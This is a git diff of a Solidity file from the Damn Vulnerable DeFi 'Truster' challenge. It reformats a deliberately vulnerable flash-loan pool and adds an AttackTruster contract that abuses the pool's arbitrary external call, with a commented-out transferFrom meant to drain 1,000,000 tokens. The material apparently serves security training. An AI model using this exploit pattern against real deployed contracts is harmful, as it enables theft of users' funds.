@@ -11,12 +11,11 @@ import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
  */
 contract TrusterLenderPool is ReentrancyGuard {
-
     using Address for address;
 
     IERC20 public immutable damnValuableToken;
 
-    constructor (address tokenAddress) {
+    constructor(address tokenAddress) {
         damnValuableToken = IERC20(tokenAddress);
     }
 
@@ -25,18 +24,41 @@ contract TrusterLenderPool is ReentrancyGuard {
         address borrower,
         address target,
         bytes calldata data
-    )
-        external
-        nonReentrant
-    {
+    ) external nonReentrant {
         uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
         require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
-        
+
         damnValuableToken.transfer(borrower, borrowAmount);
         target.functionCall(data);
 
         uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
-        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
+        require(
+            balanceAfter >= balanceBefore,
+            "Flash loan hasn't been paid back"
+        );
+    }
+}
+
+contract AttackTruster {
+    TrusterLenderPool trust;
+    IERC20 public immutable damnValuableToken;
+
+
+    constructor(address _trust, address tokenAddress) {
+        trust = TrusterLenderPool(_trust);
+        damnValuableToken = IERC20(tokenAddress);
+
     }
 
+    function attack(
+        uint256 amount,
+        address borrower,
+        address target,
+        bytes calldata data
+    ) external {
+        trust.flashLoan(amount, borrower, target, data);
+        // Once approved transfer
+        // damnValuableToken.transferFrom(address(trust), msg.sender, 1000000 ether);
+
+    }
 }
